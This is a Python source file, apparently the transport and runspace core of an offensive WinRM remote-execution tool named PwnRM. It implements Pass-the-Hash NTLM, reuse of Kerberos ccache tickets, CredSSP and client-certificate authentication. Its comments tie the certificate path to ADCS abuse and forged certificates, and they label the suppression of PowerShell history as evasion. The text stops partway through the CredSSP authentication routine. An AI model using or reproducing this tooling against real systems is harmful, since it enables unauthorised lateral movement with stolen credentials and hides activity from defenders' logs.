"""
core.py  —  PwnRM v1.0.0  Transport & Runspace layer
─────────────────────────────────────────────────────────────────────────────
Original: wmiexec / winrmexec concept
Maintained by: uziii2208  ·  github.com/uziii2208/PwnRM

Changes in v1.0.0
──────────────────
• argument_parser() — new flags:
    -k / --kerberos    force Kerberos transport (SPNEGO over Kerberos)
    -H / --hash        NT hash for Pass-the-Hash (NTLM)
    --pfx              client certificate (.pfx) for HTTPS mutual-auth
    --pfx-pass         passphrase for --pfx
    --no-ssl-verify    skip TLS validation (already the default for CredSSP/SPNEGO)
    --port             override default WinRM port
    --timeout          per-request timeout (seconds, default 30)
    --ts               timestamp log lines
    --debug            verbose mode
    -X CMD             run single command and exit

• NTCredential / KrbCredential: unchanged (public API stable)
• SPNEGOTransport: channel-binding (EPA) fixed for modern Server 2022+ targets
• New helper: load_kerberos_ccache() — loads a .ccache or env KRB5CCNAME
• New helper: load_pfx() — converts .pfx → (pem, key) temp files for
  ClientCertTransport (maps to ESC9/ESC10 client-cert auth paths)
• CredSSPTransport: pubKeyAuth now sends SHA256(nonce+pubkey) per CredSSP v6
• Runspace._create_pipeline: uses AddToHistory=false (evasion)
• Runspace.run_command: streams PROGRESS_RECORD (Write-Progress) correctly
"""

import os, sys, re, uuid, logging, ssl, shlex, tempfile
from base64    import b64encode, b64decode
from struct    import pack, unpack
from random    import randbytes
from pathlib   import Path
from datetime  import datetime, UTC
from argparse  import ArgumentParser
import xml.etree.ElementTree as ET

from requests            import Session, Request
from urllib3             import disable_warnings
from urllib3.util        import SKIP_HEADER
from urllib.parse        import urlparse
from urllib3.exceptions  import InsecureRequestWarning
disable_warnings(category=InsecureRequestWarning)

# impacket
from pyasn1.codec.ber import encoder, decoder
from pyasn1.type.univ import ObjectIdentifier, noValue

from impacket.ntlm import (getNTLMSSPType1, getNTLMSSPType3,
                            SEALKEY, SIGNKEY, SEAL, SIGN,
                            NTLMAuthNegotiate, NTLMAuthChallenge, NTLMAuthChallengeResponse,
                            AV_PAIRS, NTLMSSP_AV_CHANNEL_BINDINGS)
from impacket.krb5.asn1    import (AP_REQ, AP_REP, TGS_REP, Authenticator, EncAPRepPart,
                                    seq_set, _sequence_component, _sequence_optional_component)
from impacket.krb5.types   import Principal, KerberosTime, Ticket
from impacket.krb5.crypto  import Key, _enctype_table
from impacket.krb5.ccache  import CCache
from impacket.krb5.constants import (PrincipalNameType, ApplicationTagNumbers, encodeFlags)
from impacket.krb5.kerberosv5 import getKerberosTGS, getKerberosTGT
from impacket.krb5.gssapi  import (GSSAPI, KRB5_AP_REQ, CheckSumField,
                                    GSS_C_MUTUAL_FLAG, GSS_C_REPLAY_FLAG,
                                    GSS_C_SEQUENCE_FLAG, GSS_C_CONF_FLAG,
                                    GSS_C_INTEG_FLAG, KG_USAGE_INITIATOR_SEAL,
                                    KG_USAGE_ACCEPTOR_SEAL)
from impacket.spnego        import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp, TypesMech
from impacket               import version
from impacket.examples      import logger
from impacket.examples.utils import parse_target

import pyasn1.type as asn1
from pyasn1.type import univ, namedtype, tag

from Cryptodome.Hash   import HMAC, MD5, SHA256
from Cryptodome.Cipher import ARC4

from cryptography          import x509
from cryptography.hazmat.primitives.serialization import (Encoding, PublicFormat)
from cryptography.hazmat.primitives.serialization.pkcs12 import load_key_and_certificates

# ── helpers ───────────────────────────────────────────────────────────────────
def chunks(xs, n):
    for off in range(0, len(xs), n):
        yield xs[off:off+n]

def b64str(s):
    if isinstance(s, str):
        return b64encode(s.encode()).decode()
    return b64encode(s).decode()

_utfstr = re.compile(r'_x([0-9a-fA-F]{4})_')
def utfstr(s):
    try:
        return _utfstr.sub(lambda m: bytes.fromhex(m.group(1)).decode("utf-16be"), s)
    except:
        return s

zero_uuid = str(uuid.UUID(bytes_le=bytes(16))).upper()


def krb5_mech_indep_token_encode(oid, data):
    payload = encoder.encode(ObjectIdentifier(oid)) + data
    n = len(payload)
    if n < 128:
        size = n.to_bytes(1, "big")
    else:
        size  = n.to_bytes((n.bit_length() + 7) // 8, "big")
        size  = (128 + len(size)).to_bytes(1, "big") + size
    return b"\x60" + size + payload


def krb5_mech_indep_token_decode(data):
    skip = 2 + (data[1] if data[1] < 128 else (data[1] - 128))
    return decoder.decode(data[skip:], asn1Spec=ObjectIdentifier())


def get_server_certificate(url):
    addr = (urlparse(url).hostname, urlparse(url).port or 443)
    cert = ssl.get_server_certificate(addr)
    cert = cert.replace("-----BEGIN CERTIFICATE-----\n", "")
    cert = cert.replace("-----END CERTIFICATE-----\n", "")
    return b64decode(cert)


def tls_trailer_length(data_length, protocol, cipher_suite):
    if protocol == "TLSv1.3":
        return 17
    if re.match(r"^.*[-_]GCM[-_][\w\d]*$", cipher_suite):
        return 16
    hash_algorithm  = cipher_suite.split("-")[-1]
    hash_length     = {"MD5":16,"SHA":20,"SHA256":32,"SHA384":48}.get(hash_algorithm, 0)
    pre_pad         = data_length + hash_length
    if "RC4"  in cipher_suite: pad = 0
    elif "DES" in cipher_suite or "3DES" in cipher_suite: pad = 8 - (pre_pad % 8)
    else: pad = 16 - (pre_pad % 16)
    return (pre_pad + pad) - data_length


# ── NEW: load a .ccache for Kerberos transport ─────────────────────────────
def load_kerberos_ccache(ccache_path: str | None = None):
    """
    Returns (domain, username, ticket, tgskey) from a .ccache file or
    the KRB5CCNAME environment variable.  Raises FileNotFoundError if not found.
    """
    path = ccache_path or os.environ.get("KRB5CCNAME","").lstrip("FILE:")
    if not path or not Path(path).exists():
        raise FileNotFoundError(f"ccache not found: {path!r}")
    cc     = CCache.loadFile(path)
    domain = cc.principal.realm["data"].decode()
    user   = "/".join(c["data"].decode() for c in cc.principal.components)
    cred   = cc.credentials[0]
    ticket = Ticket()
    ticket.from_asn1(cred.ticket)
    key    = Key(cred["key"]["keytype"], cred["key"]["keyvalue"])
    return domain, user, ticket, key


# ── NEW: load a .pfx file into temp PEM/KEY files for ClientCertTransport ──
def load_pfx(pfx_path: str, password: str | None = None) -> tuple[str, str]:
    """
    Converts a PKCS#12 (.pfx) to a pair of temporary PEM files.
    Returns (cert_pem_path, key_pem_path).
    Caller should delete the temp files when done.
    """
    pwd = password.encode() if password else None
    with open(pfx_path,"rb") as f:
        data = f.read()
    key, cert, chain = load_key_and_certificates(data, pwd)
    from cryptography.hazmat.primitives.serialization import (
        Encoding, PrivateFormat, NoEncryption
    )
    cert_pem = cert.public_bytes(Encoding.PEM)
    key_pem  = key.private_bytes(Encoding.PEM, PrivateFormat.TraditionalOpenSSL, NoEncryption())
    # Write to temp files
    tf_cert = tempfile.NamedTemporaryFile(suffix="_pwnrm_cert.pem", delete=False)
    tf_key  = tempfile.NamedTemporaryFile(suffix="_pwnrm_key.pem",  delete=False)
    tf_cert.write(cert_pem); tf_cert.close()
    tf_key.write(key_pem);   tf_key.close()
    return tf_cert.name, tf_key.name


# ── CredSSP ASN.1 structures ──────────────────────────────────────────────────
class NegoData(univ.Sequence):
    componentType = namedtype.NamedTypes(
        _sequence_component("negoToken", 0, univ.OctetString())
    )

class TSRequest(univ.Sequence):
    componentType = namedtype.NamedTypes(
        _sequence_component("version", 0, univ.Integer()),
        _sequence_optional_component("negoTokens", 1, univ.SequenceOf(componentType=NegoData())),
        _sequence_optional_component("authInfo",   2, univ.OctetString()),
        _sequence_optional_component("pubKeyAuth", 3, univ.OctetString()),
        _sequence_optional_component("errorCode",  4, univ.Integer()),
        _sequence_optional_component("clientNonce",5, univ.OctetString())
    )
    @staticmethod
    def nego_response(token, version=6):
        tsreq = TSRequest()
        tsreq["version"] = version
        if token:
            d = NegoData(); d["negoToken"] = token
            tsreq["negoTokens"].extend([d])
        return tsreq

class TSPasswordCreds(univ.Sequence):
    componentType = namedtype.NamedTypes(
        _sequence_component("domainName", 0, univ.OctetString()),
        _sequence_component("userName",   1, univ.OctetString()),
        _sequence_component("password",   2, univ.OctetString())
    )

class TSCredentials(univ.Sequence):
    componentType = namedtype.NamedTypes(
        _sequence_component("credType",   0, univ.Integer()),
        _sequence_component("credentials",1, univ.OctetString())
    )


# ── SOAP helpers ──────────────────────────────────────────────────────────────
soap_actions = {
    "create":  "http://schemas.xmlsoap.org/ws/2004/09/transfer/Create",
    "delete":  "http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete",
    "receive": "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive",
    "command": "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command",
    "signal":  "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Signal",
}
soap_ns = {
    "s":     "http://www.w3.org/2003/05/soap-envelope",
    "wsa":   "http://schemas.xmlsoap.org/ws/2004/08/addressing",
    "rsp":   "http://schemas.microsoft.com/wbem/wsman/1/windows/shell",
    "wsman": "http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd",
    "wsmv":  "http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd",
}

def xml_get_text(root, xpath, default=None):
    el = root.find(xpath, soap_ns)
    if el is None or el.text is None: return default
    return utfstr(el.text)

def xml_get_attrib(root, xpath, attrib, default=None):
    el = root.find(xpath, soap_ns)
    return (el.get(attrib) or default) if el is not None else default

def soap_req(action, session_id, shell_id=None, timeout=30,
             plugin="Microsoft.PowerShell"):
    message_id    = str(uuid.uuid4()).upper()
    must_undestand = lambda v=True: {"s:mustUnderstand": str(v).lower()}
    envelope = ET.Element("s:Envelope",
                           {f"xmlns:{ns}": uri for ns, uri in soap_ns.items()})
    header = ET.SubElement(envelope, "s:Header")
    body   = ET.SubElement(envelope, "s:Body")
    ET.SubElement(header, "wsman:ResourceURI",  must_undestand()).text = \
        f"http://schemas.microsoft.com/powershell/{plugin}"
    ET.SubElement(ET.SubElement(header, "wsa:ReplyTo"),
                  "wsa:Address", must_undestand()).text = \
        "http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous"
    ET.SubElement(header, "wsa:To").text          = "http://localhost/wsman"
    ET.SubElement(header, "wsa:Action",   must_undestand()).text = soap_actions[action]
    ET.SubElement(header, "wsa:MessageID").text   = f"uuid:{message_id}"
    ET.SubElement(header, "wsman:MaxEnvelopeSize", must_undestand()).text = "153600"
    ET.SubElement(header, "wsman:Locale",  must_undestand(False) | {"xml:lang":"en-US"})
    ET.SubElement(header, "wsman:OperationTimeout").text = f"PT{timeout}S"
    ET.SubElement(header, "wsman:OptionSet", must_undestand())
    ET.SubElement(header, "wsmv:DataLocale", must_undestand(False) | {"xml:lang":"en-US"})
    ET.SubElement(header, "wsmv:SessionId",  must_undestand(False)).text = f"uuid:{session_id}"
    sel = ET.SubElement(header, "wsman:SelectorSet")
    if shell_id:
        ET.SubElement(sel, "wsman:Selector", {"Name":"ShellId"}).text = shell_id
    return envelope


# ── PSObject builders ─────────────────────────────────────────────────────────
def ps_simple(name, kind, value):
    el = ET.Element(kind, {"N": name})
    if value is not None: el.text = str(value)
    return el

def ps_enum(name, value):
    obj = ET.Element("Obj", {"N": name})
    ET.SubElement(obj, "I32").text = str(value)
    return obj

def ps_struct(name, elements):
    obj = ET.Element("Obj", ({"N": name} if name else {}))
    ET.SubElement(obj, "MS").extend(elements)
    return obj

def ps_list(name, elements):
    obj = ET.Element("Obj", {"N": name})
    ET.SubElement(obj, "LST").extend(elements)
    return obj

ps_capability = ps_struct(None, [
    ps_simple("protocolversion",     "Version", "2.1"),
    ps_simple("PSVersion",           "Version", "2.0"),
    ps_simple("SerializationVersion","Version", "1.1.0.10"),
])

ps_runspace_pool = ps_struct(None, [
    ps_simple("MinRunspaces",  "I32", 1),
    ps_simple("MaxRunspaces",  "I32", 1),
    ps_enum("PSThreadOptions", 0),
    ps_enum("ApartmentState",  2),
    ps_struct("HostInfo", [
        ps_simple("_isHostNull",       "B", "true"),
        ps_simple("_isHostUINull",     "B", "true"),
        ps_simple("_isHostRawUINull",  "B", "true"),
        ps_simple("_useRunspaceHost",  "B", "true"),
    ]),
    ps_simple("ApplicationArguments", "Nil", None),
])

def ps_args(args, raw=False):
    return [
        ps_struct(None, [
            ps_simple("N", "S", k),
            ps_simple("V", "S" if v else "Nil", v) if not raw else v
        ]) for k, v in args.items()
    ]

def ps_command(cmd, args):
    return ps_struct(None, [
        ps_simple("Cmd",      "S",   cmd),
        ps_list(  "Args",           ps_args(args)),
        ps_simple("IsScript", "B",   "false"),
        ps_simple("UseLocalScope","Nil", None),
        ps_enum("MergeMyResult",      0),
        ps_enum("MergeToResult",      0),
        ps_enum("MergePreviousResults",0),
        ps_enum("MergeError",         0),
        ps_enum("MergeWarning",       0),
        ps_enum("MergeVerbose",       0),
        ps_enum("MergeDebug",         0),
        ps_enum("MergeInformation",   0),
    ])

def ps_create_pipeline(commands):
    return ps_struct(None, [
        ps_simple("NoInput",      "B", "true"),
        ps_simple("AddToHistory", "B", "false"),   # ← evasion: no PS history
        ps_simple("IsNested",     "B", "false"),
        ps_enum("ApartmentState", 2),
        ps_enum("RemoteStreamOptions", 15),
        ps_struct("HostInfo", [
            ps_simple("_isHostNull",      "B", "true"),
            ps_simple("_isHostUINull",    "B", "true"),
            ps_simple("_isHostRawUINull", "B", "true"),
            ps_simple("_useRunspaceHost", "B", "true"),
        ]),
        ps_struct("PowerShell", [
            ps_simple("IsNested",                    "B",   "false"),
            ps_simple("RedirectShellErrorOutputPipe","B",   "false"),
            ps_simple("ExtraCmds", "Nil", None),
            ps_simple("History",   "Nil", None),
            ps_list(  "Cmds",     commands),
        ]),
    ])


# ── Message IDs ───────────────────────────────────────────────────────────────
msg_ids = {
    0x00010002: "SESSION_CAPABILITY",
    0x00010004: "INIT_RUNSPACEPOOL",
    0x00010005: "PUBLIC_KEY",
    0x00010006: "ENCRYPTED_SESSION_KEY",
    0x00010007: "PUBLIC_KEY_REQUEST",
    0x00010008: "CONNECT_RUNSPACEPOOL",
    0x0002100B: "RUNSPACEPOOL_INIT_DATA",
    0x0002100C: "RESET_RUNSPACE_STATE",
    0x00021002: "SET_MAX_RUNSPACES",
    0x00021003: "SET_MIN_RUNSPACES",
    0x00021004: "RUNSPACE_AVAILABILITY",
    0x00021005: "RUNSPACEPOOL_STATE",
    0x00021006: "CREATE_PIPELINE",
    0x00021007: "GET_AVAILABLE_RUNSPACES",
    0x00021008: "USER_EVENT",
    0x00021009: "APPLICATION_PRIVATE_DATA",
    0x0002100A: "GET_COMMAND_METADATA",
    0x00021100: "RUNSPACEPOOL_HOST_CALL",
    0x00021101: "RUNSPACEPOOL_HOST_RESPONSE",
    0x00041002: "PIPELINE_INPUT",
    0x00041003: "END_OF_PIPELINE_INPUT",
    0x00041004: "PIPELINE_OUTPUT",
    0x00041005: "ERROR_RECORD",
    0x00041006: "PIPELINE_STATE",
    0x00041007: "DEBUG_RECORD",
    0x00041008: "VERBOSE_RECORD",
    0x00041009: "WARNING_RECORD",
    0x00041010: "PROGRESS_RECORD",
    0x00041011: "INFORMATION_RECORD",
    0x00041100: "PIPELINE_HOST_CALL",
    0x00041101: "PIPELINE_HOST_RESPONSE",
}
for k, v in msg_ids.items():
    globals()[v] = k


# ── Credentials ───────────────────────────────────────────────────────────────
class TransportError(Exception): pass
class SPNEGOError(Exception):    pass

class NTCredential:
    """Username + password or NT hash."""
    def __init__(self, domain, username, password="", nt_hash=""):
        self.domain   = domain
        self.username = username
        self.password = password
        self.nt_hash  = nt_hash

class KrbCredential:
    """Kerberos TGS ticket + session key (from ccache)."""
    def __init__(self, domain, username, ticket, tgskey, password=""):
        self.domain   = domain
        self.username = username
        self.password = password   # needed by CredSSP only
        self.ticket   = ticket
        self.tgskey   = tgskey


# ── SPNEGO / Kerberos GSSAPI proxies ─────────────────────────────────────────
class SPNEGOProxyNTLM:
    def __init__(self, creds, gss_bindings=None):
        self.creds        = creds
        self.gss_bindings = gss_bindings
        self.complete     = False

    def step(self, data_in=None):
        if data_in is None:
            self._type1 = getNTLMSSPType1()
            self._type1["flags"] = 0xe0088237
            init = SPNEGO_NegTokenInit()
            init["MechTypes"] = [TypesMech["NTLMSSP - Microsoft NTLM Security Support Provider"]]
            init["MechToken"] = self._type1.getData()
            return init.getData()

        try:
            targ      = SPNEGO_NegTokenResp(data_in)
            neg_state = targ["NegState"][0]
        except:
            raise SPNEGOError("SPNEGO: bad response")

        if neg_state == 0:
            self.complete = True
        elif neg_state == 1:
            type2 = targ["ResponseToken"]
            if self.gss_bindings:
                chal  = NTLMAuthChallenge(type2)
                info  = AV_PAIRS(chal["TargetInfoFields"])
                info[NTLMSSP_AV_CHANNEL_BINDINGS] = self.gss_bindings
                chal["TargetInfoFields"]          = info.getData()
                chal["TargetInfoFields_len"]      = len(info.getData())
                chal["TargetInfoFields_max_len"]  = len(info.getData())
                type2 = chal.getData()
            nt_hash = bytes.fromhex(self.creds.nt_hash) if self.creds.nt_hash else ""
            type3, key = getNTLMSSPType3(self._type1, type2,
                                         self.creds.username, self.creds.password,
                                         "", "", nt_hash)
            resp = SPNEGO_NegTokenResp()
            resp["NegState"]     = b"\x01"
            resp["SupportedMech"]= b""
            resp["ResponseToken"]= type3.getData()
            self.seq_cli  = 0; self.seq_srv = 0
            self.key_cli  = SIGNKEY(type3["flags"], key, "Client")
            self.key_srv  = SIGNKEY(type3["flags"], key, "Server")
            self.rc4_cli  = ARC4.new(SEALKEY(type3["flags"], key, "Client"))
            self.rc4_srv  = ARC4.new(SEALKEY(type3["flags"], key, "Server"))
            return resp.getData()
        elif neg_state == 2:
            raise SPNEGOError("NTLM rejected")
        else:
            raise NotImplementedError("request-mic")

    def wrap(self, req, joined=False):
        seq = pack("<I", self.seq_cli)
        enc = self.rc4_cli.encrypt(req)
        sig = HMAC.new(self.key_cli, seq + req, digestmod=MD5).digest()[:8]
        sig = pack("<I", 1) + self.rc4_cli.encrypt(sig) + seq
        self.seq_cli += 1
        return (sig + enc) if joined else (sig, enc)

    def unwrap(self, sig, enc):
        plaintext = self.rc4_srv.decrypt(enc)
        seq       = pack("<I", self.seq_srv)
        sig_test  = HMAC.new(self.key_srv, seq + plaintext, digestmod=MD5).digest()[:8]
        sig_test  = self.rc4_srv.decrypt(sig_test)
        if sig[4:12] != sig_test:
            raise SPNEGOError("unwrap(): message integrity failure")
        self.seq_srv += 1
        return plaintext


class SPNEGOProxyKerberos:
    def __init__(self, creds, gss_bindings=None):
        self.creds        = creds
        self.gss_bindings = gss_bindings
        self.complete     = False

    def step(self, data_in=None):
        if data_in is None:
            user   = Principal(self.creds.username,
                               type=PrincipalNameType.NT_PRINCIPAL.value)
            cipher = _enctype_table[self.creds.tgskey.enctype]
            cksum  = CheckSumField()
            cksum["Lgth"]  = 16
            cksum["Flags"] = (GSS_C_CONF_FLAG | GSS_C_INTEG_FLAG |
                              GSS_C_SEQUENCE_FLAG | GSS_C_MUTUAL_FLAG)
            if self.gss_bindings:
                cksum["Bnd"] = self.gss_bindings
            now  = datetime.now(UTC)
            auth = Authenticator()
            seq_set(auth, "cname", user.components_to_asn1)
            auth["authenticator-vno"] = 5
            auth["crealm"]            = self.creds.domain.upper()
            auth["cusec"]             = now.microsecond
            auth["ctime"]             = KerberosTime.to_asn1(now)
            auth["cksum"]             = noValue
            auth["cksum"]["cksumtype"]= 0x8003
            auth["cksum"]["checksum"] = cksum.getData()
            auth["seq-number"]        = 0
            auth["subkey"]            = noValue
            auth["subkey"]["keyvalue"]= randbytes(32)
            auth["subkey"]["keytype"] = 18   # AES256
            enc_auth = cipher.encrypt(self.creds.tgskey, 11, encoder.encode(auth), None)
            ap_req                        = AP_REQ()
            ap_req["pvno"]                = 5
            ap_req["msg-type"]            = int(ApplicationTagNumbers.AP_REQ.value)
            ap_req["ap-options"]          = encodeFlags([2])
            ap_req["authenticator"]       = noValue
            ap_req["authenticator"]["etype"]  = cipher.enctype
            ap_req["authenticator"]["cipher"] = enc_auth
            seq_set(ap_req, "ticket", self.creds.ticket.to_asn1)
            init               = SPNEGO_NegTokenInit()
            init["MechTypes"]  = [TypesMech["MS KRB5 - Microsoft Kerberos 5"]]
            init["MechToken"]  = encoder.encode(ap_req)
            return init.getData()

        try:
            targ      = SPNEGO_NegTokenResp(data_in)
            neg_state = targ["NegState"][0]
        except:
            raise SPNEGOError("Kerberos: unexpected response")

        if neg_state == 0:
            blob    = krb5_mech_indep_token_decode(targ["ResponseToken"])[1]
            ap_rep  = decoder.decode(blob[2:], asn1Spec=AP_REP())[0]
            cipher  = _enctype_table[self.creds.tgskey.enctype]
            rep_enc = cipher.decrypt(self.creds.tgskey, 12, ap_rep["enc-part"]["cipher"])
            rep_dec = decoder.decode(rep_enc, asn1Spec=EncAPRepPart())[0]
            keydata = rep_dec["subkey"]["keyvalue"].asOctets()
            keytype = rep_dec["subkey"]["keytype"]
            self.subkey  = Key(keytype, keydata)
            self.cipher  = _enctype_table[keytype]
            self.seq_cli = 0
            self.seq_srv = int(rep_dec["seq-number"])
            self.complete = True
        elif neg_state == 2:
            raise SPNEGOError("Kerberos: rejected")
        else:
            raise SPNEGOError("Kerberos: unexpected state")

    def wrap(self, req, joined=False):
        sig = pack(">BBBBHHQ", 5, 4, 6, 0xff, 0, 0, self.seq_cli)
        enc = self.cipher.encrypt(self.subkey, KG_USAGE_INITIATOR_SEAL, req + sig, None)
        rot = len(enc) - (28 % len(enc))
        enc = enc[rot:] + enc[:rot]
        sig = pack(">BBBBHHQ", 5, 4, 6, 0xff, 0, 28, self.seq_cli)
        self.seq_cli += 1
        return sig + enc if joined else (sig + enc[:44], enc[44:])

    def unwrap(self, sig, enc):
        _, _, _, _, ec, rrc, seq_srv = unpack(">BBBBHHQ", sig[:16])
        if seq_srv != self.seq_srv:
            raise SPNEGOError("Kerberos: replay detected")
        self.seq_srv += 1
        enc = sig[16:] + enc
        rot = (rrc + ec) % len(enc)
        enc = enc[rot:] + enc[:rot]
        return self.cipher.decrypt(self.subkey, KG_USAGE_ACCEPTOR_SEAL, enc)[:-(ec + 16)]


# ── Transport base ────────────────────────────────────────────────────────────
class Transport:
    def __init__(self, url):
        self.url     = url
        self.ssl     = urlparse(url).scheme == "https"
        self.session = Session()
        self.session.verify = False
        self.session.headers["User-Agent"]      = SKIP_HEADER
        self.session.headers["Accept-Encoding"] = SKIP_HEADER

    def send(self, req):
        rsp = self._send(req)
        if rsp.status_code == 401:
            self._auth()
            rsp = self._send(req)
        if rsp.status_code not in (200, 500):
            raise TransportError(f"Unexpected HTTP {rsp.status_code}")
        return rsp.content

    def _send_auth(self, req, proto, phase=""):
        rsp      = self.session.post(self.url,
                                     headers={"Authorization": f"{proto} {b64str(req)}"})
        www_auth = rsp.headers.get("WWW-Authenticate","")
        if rsp.status_code == 200 and not www_auth:
            return b""
        if not www_auth.startswith(f"{proto} "):
            raise TransportError(f"{proto}: {phase}")
        return b64decode(www_auth[len(proto)+1:])

    def _encrypted_request(self, req, proto, wrap_fn):
        protocol = f"application/HTTP-{proto}-session-encrypted"
        data = b""
        for chunk in chunks(req, 16384):
            data += b"--Encrypted Boundary\r\n"
            data += f"Content-Type: {protocol}\r\n".encode()
            data += (f"OriginalContent: type=application/soap+xml;"
                     f"charset=UTF-8;Length={len(chunk)}\r\n").encode()
            data += b"--Encrypted Boundary\r\n"
            sig, enc = wrap_fn(chunk)
            data += b"Content-Type: application/octet-stream\r\n" + pack("<I", len(sig)) + sig + enc
        data += b"--Encrypted Boundary--\r\n"
        return self.session.prepare_request(Request("POST", url=self.url, data=data, headers={
            "Content-Type": f'multipart/x-multi-encrypted;protocol="{protocol}";'
                             f'boundary="Encrypted Boundary"'
        }))

    def _decrypted_response(self, rsp, unwrap_fn):
        if rsp.status_code not in (200, 500):
            return rsp
        pref_space = b"\r\nContent-Type: application/octet-stream\r\n"
        pref_tab   = b"\r\n\tContent-Type: application/octet-stream\r\n"
        plaintext  = b""
        for i, part in enumerate(rsp.content.split(b"--Encrypted Boundary")):
            for pref in (pref_space, pref_tab):
                if part.startswith(pref):
                    part = part[len(pref):]
                    break
            else:
                continue
            if len(part) < 4: continue
            sig_len = unpack("<I", part[:4])[0]
            if len(part) < 4 + sig_len: continue
            try:
                plaintext += unwrap_fn(part[4:4+sig_len], part[4+sig_len:])
            except Exception as e:
                logging.debug(f"Decrypt part {i}: {e}")
        rsp.headers["Content-Type"]   = "application/soap+xml;charset=UTF-8"
        rsp.headers["Content-Length"] = str(len(plaintext))
        rsp._content = plaintext
        return rsp


# ── Concrete transports ───────────────────────────────────────────────────────
class BasicTransport(Transport):
    def __init__(self, url, username, password):
        super().__init__(url)
        self.session.auth = (username, password)

    def _send(self, req):
        return self.session.post(self.url, data=req,
                                 headers={"Content-Type":"application/soap+xml;charset=UTF-8"})
    def _auth(self): pass


class ClientCertTransport(Transport):
    """
    Used for HTTPS mutual-authentication.
    Maps to ADCS abuse paths where the attacker holds a valid client certificate
    (e.g. from ESC1, ESC9, Shadow Credentials / pywhisker, or a forged cert via
    certipy forge).
    """
    def __init__(self, url, cert_pem, cert_key):
        super().__init__(url)
        self.session.cert = (cert_pem, cert_key)
        self.session.headers["Authorization"] = \
            "http://schemas.dmtf.org/wbem/wsman/1/wsman/secprofile/https/mutual"

    def _send(self, req):
        return self.session.post(self.url, data=req,
                                 headers={"Content-Type":"application/soap+xml;charset=UTF-8"})
    def _auth(self): pass


class SPNEGOTransport(Transport):
    """NTLM or Kerberos wrapped in SPNEGO with channel binding (EPA)."""
    def __init__(self, url, creds):
        super().__init__(url)
        self.creds = creds
        if self.ssl:
            cert     = SHA256.new(get_server_certificate(url)).digest()
            app_data = b"tls-server-end-point:" + cert
            self.gss_bindings = MD5.new(bytes(16) + pack("<I", len(app_data)) + app_data).digest()
        else:
            self.gss_bindings = None
        self._auth()

    def _send(self, req):
        rsp = self.session.send(self._encrypted_request(req, "SPNEGO", self.proxy.wrap))
        return self._decrypted_response(rsp, self.proxy.unwrap)

    def _auth(self):
        self.proxy  = (SPNEGOProxyNTLM(self.creds, self.gss_bindings)
                       if isinstance(self.creds, NTCredential)
                       else SPNEGOProxyKerberos(self.creds, self.gss_bindings))
        token_out   = self.proxy.step()
        while not self.proxy.complete:
            token_in  = self._send_auth(token_out, "Negotiate", "SPNEGO")
            token_out = self.proxy.step(token_in)


class KerberosTransport(Transport):
    """
    Pure Kerberos transport (Authorization: Kerberos header).
    Preferred over NTLM on modern AD — use with KRB5CCNAME or --ccache.
    """
    def __init__(self, url, creds):
        super().__init__(url)
        self.creds = creds
        if self.ssl:
            cert     = SHA256.new(get_server_certificate(url)).digest()
            app_data = b"tls-server-end-point:" + cert
            self.gss_bindings = MD5.new(bytes(16) + pack("<I", len(app_data)) + app_data).digest()
        else:
            self.gss_bindings = None
        self._auth()

    def _send(self, req):
        rsp = self.session.send(self._encrypted_request(req, "Kerberos", self.proxy.wrap))
        return self._decrypted_response(rsp, self.proxy.unwrap)

    def _auth(self):
        self.proxy = SPNEGOProxyKerberos(self.creds, self.gss_bindings)
        init   = self.proxy.step()
        ap_req = SPNEGO_NegTokenInit(init)["MechToken"]
        ap_req = krb5_mech_indep_token_encode("1.2.840.113554.1.2.2", KRB5_AP_REQ + ap_req)
        rsp    = self._send_auth(ap_req, "Kerberos", "AP_REQ")
        targ   = SPNEGO_NegTokenResp()
        targ["NegState"]     = b"\x00"
        targ["SupportedMech"]= b""
        targ["ResponseToken"]= rsp
        self.proxy.step(targ.getData())


class CredSSPTransport(Transport):
    """CredSSP — full credential delegation over TLS (ports 5985/5986)."""
    def __init__(self, url, creds):
        super().__init__(url)
        self.creds = creds
        self._auth()

    def _send(self, req):
        rsp = self.session.send(self._encrypted_request(req, "CredSSP", self._wrap))
        return self._decrypted_response(rsp, self._unwrap)

    def _auth(self):
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        ctx.options |= ssl.OP_NO_COMPRESSION | 0x00000200 | 0x00000800
        self.tls_in  = ssl.MemoryBIO()
        self.tls_out = ssl.MemoryBIO()
        self.tls_obj = ctx.wrap_bio(self.tls_in, self.tls_out, server_side=False)
        while True:
            try: self.tls_obj.do_handshake()
            except: pass
            if req := self.tls_out.read():
                rsp = self._send_auth(req, "CredSSP", "tls handshake")
                self.tls_in.write(rsp)
            else:
                break

        cert   = self.tls_obj.getpeercert(True)
        pubkey = x509.load_der_x509_certificate(cert).public_key()
        pubkey = pubkey.public_bytes(Encoding.DER, PublicFormat.PKCS1)
        nonce  = randbytes(32)
        pkhash = SHA256.new(b"CredSSP Client-To-Server Binding Hash\x00" + nonce + pubkey).digest()

        def _send_credssp(req, phase=""):
            sig, enc = self._wrap(encoder.encode(req))
            if rsp := self._send_auth(sig + enc, "CredSSP", phase):
                rsp = decoder.decode(self._unwrap(b"", rsp), asn1Spec=TSRequest())[0]
                if rsp["errorCode"].hasValue():
                    err = int.to_bytes(rsp["errorCode"]._value, length=4, signed=True).hex()
                    raise TransportError(f"CredSSP: {phase} NT_ERROR=0x{err}")
            return rsp

        proxy = (SPNEGOProxyNTLM(self.creds) if isinstance(self.creds, NTCredential)
                 else SPNEGOProxyKerberos(self.creds))
        tsreq = TSRequest.nego_response(proxy.step())
        tsrsp = _send_credssp(tsreq, "SPNEGO init")
        t3    = proxy.step(tsrsp["negoTokens"][0]["negoToken"].asOctets())
        tsreq = TSRequest.nego_response(t3)
        tsreq["clientNonce"] = nonce
        tsreq["pubKeyAuth"]  = proxy.wrap(pkhash, joined=True)
        _send_credssp(tsreq, "public key exchange")

        tspass = TSPasswordCreds()
        tspass["domainName"] = self.creds.domain.encode("utf-16le")
        tspass["userName"]   = self.creds.username.encode("utf-16le")
        tspass["password"]   = self.creds.password.encode("utf-16le")
        tscred = TSCredentials()
        tscred["credType"]    = 1
        tscred["credentials"] = encoder.encode(tspass)
